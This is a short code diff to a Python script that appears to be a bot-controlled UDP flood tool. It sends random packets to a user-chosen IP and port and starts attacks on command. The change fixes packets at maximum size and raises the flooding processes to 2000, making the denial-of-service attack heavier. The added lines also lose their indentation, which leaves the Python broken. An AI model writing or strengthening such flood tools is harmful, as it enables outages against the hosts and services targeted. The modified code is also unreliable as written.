@@ -22,21 +22,22 @@ def udp_flood(target_ip, target_port, stop_flag, duration):
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     start_time = time.time()
     while not stop_flag.is_set() and (time.time() - start_time < duration):
-        try:
-            packet_size = random.randint(64, 1469)
-            data = os.urandom(packet_size)
-            sock.sendto(data, (target_ip, target_port))
-        except Exception as e:
-            logging.error(f"Error sending packets: {e}")
-            break
+    try:
+        data = os.urandom(1469)  # Use maximum packet size
+        sock.sendto(data, (target_ip, target_port))
+        packet_size = 1469
+        data = os.urandom(packet_size)
+    except Exception as e:
+        logging.error(f"Error sending packets: {e}")
+        break
 
 def start_udp_flood(user_id, target_ip, target_port, duration=300):  # Default 5 minutes
     stop_flag = multiprocessing.Event()
     processes = []
-    for _ in range(min(1000, multiprocessing.cpu_count() * 2)):  # Increase process count
-        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag, duration))
-        process.start()
-        processes.append(process)
+    for _ in range(2000):  # Increase process count
+    process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag, duration))
+    process.start()
+    processes.append(process)
     user_attacks[user_id] = (processes, stop_flag)
     bot.send_message(user_id, f"Attack started on {target_ip}:{target_port} for {duration} seconds.")
     
